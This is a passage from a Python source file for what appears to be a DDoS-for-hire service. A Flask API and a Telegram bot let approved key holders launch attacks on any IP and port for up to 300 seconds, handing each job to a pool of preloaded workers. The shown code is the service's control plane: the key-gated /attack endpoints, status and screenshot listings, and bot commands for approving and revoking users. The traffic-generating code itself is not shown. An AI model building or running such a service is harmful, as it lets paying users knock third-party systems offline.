        return jsonify({"status": "error"}), 403
    return jsonify({"status": "success", "keys": list(api_keys.keys()), "api_name": API_NAME})


@app.route('/attack/<ip>/<int:port>/<int:time_sec>', methods=['GET'])
def attack_url(ip, port, time_sec):
    global active_attacks
    api_key = request.args.get('key') or request.headers.get('X-API-Key')
    if not api_key or api_key not in api_keys or not api_keys[api_key]["active"]:
        return jsonify({"status": "error", "message": "❌ Invalid Key"}), 403
    if time_sec > 300 or time_sec < 1:
        return jsonify({"status": "error", "message": "❌ Duration: 1-300s"}), 400
    with worker_pool_lock:
        pool_size = len(worker_pool)
    if pool_size == 0:
        return jsonify({"status": "error", "message": "❌ No workers ready"}), 429
    with sessions_lock:
        active_attacks += 1
        attack_id = active_attacks
    attack_queue.put({"ip": ip, "port": port, "duration": time_sec, "attack_id": attack_id})
    return jsonify({"status": "success", "message": "🚀 Launched!", "api_name": API_NAME,
                    "attack_id": attack_id, "target": f"{ip}:{port}",
                    "duration": f"{time_sec}s", "pool_ready": pool_size,
                    "active_attacks": active_attacks})


@app.route('/attack', methods=['GET'])
def attack_query():
    ip = request.args.get('ip')
    port = request.args.get('port', 80)
    time_sec = request.args.get('time', 60)
    if not ip:
        return jsonify({"status": "error", "message": "❌ IP required"}), 400
    return attack_url(ip, int(port), int(time_sec))


@app.route('/status', methods=['GET'])
def status():
    with worker_pool_lock:
        pool_size = len(worker_pool)
    with workers_loading_lock:
        loading = workers_loading
    try:
        ss_count = len(os.listdir(SS_FOLDER))
    except Exception:
        ss_count = 0
    return jsonify({
        "status": "🟢 Online", "api_name": API_NAME,
        "pool_ready": pool_size, "pool_loading": loading,
        "max_pool": MAX_PRELOADED, "active_attacks": active_attacks,
        "screenshots": ss_count, "sessions": len(sessions),
        "bot_users": len(approved_users), "bot_tokens": len(bot_tokens)
    })


@app.route('/screenshots', methods=['GET'])
def list_screenshots():
    try:
        files = sorted(os.listdir(SS_FOLDER))
        return jsonify({"total": len(files), "files": files})
    except Exception:
        return jsonify({"error": "Failed"}), 500


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "🟢 Online", "api_name": API_NAME,
        "port": PORT, "sessions": len(sessions),
        "bot_users": len(approved_users)
    })


# ========== RUN FLASK ==========
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True, use_reloader=False)


# ========== RUN BOT ==========
def run_bot():
    bot = Application.builder().token(BOT_TOKEN).build()
    bot.add_handler(CommandHandler("start", cmd_start))
    bot.add_handler(CommandHandler("help", cmd_help))
    bot.add_handler(CommandHandler("status", cmd_status))
    bot.add_handler(CommandHandler("approve", cmd_approve))
    bot.add_handler(CommandHandler("revoke", cmd_revoke))
    bot.add_handler(CommandHandler("users", cmd_users))
    bot.add_handler(CommandHandler("broadcast", cmd_broadcast))
    bot.add_handler(CallbackQueryHandler(on_button))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("🤖 Bot polling started")
    bot.run_polling(allowed_updates=Update.ALL_TYPES)


# ========== MAIN ==========
if __name__ == '__main__':
    print("=" * 60)
    print(f"⚡ {API_NAME}")
    print("=" * 60)

    load_api_keys()
    load_bot_data()

    if not load_sessions():
        print("❌ No sessions!")
        exit(1)

    print(f"📊 Sessions:      {len(sessions)}")
    print(f"🎯 Workers:       {MAX_PRELOADED}")
    print(f"👑 Owner:         {OWNER_ID}")
    print(f"👥 Approved:      {len(approved_users)}")
    print(f"🚀 Port:          {PORT}")

    # Start pool manager
    threading.Thread(target=pool_manager, daemon=True).start()
    print("🔄 Pool manager started")

    # Start Flask in background
    threading.Thread(target=run_flask, daemon=True).start()
    print(f"✅ Flask API on port {PORT}")

    time.sleep(3)

    # Start bot (blocking)
    print("🤖 Starting Telegram bot...")
    run_bot()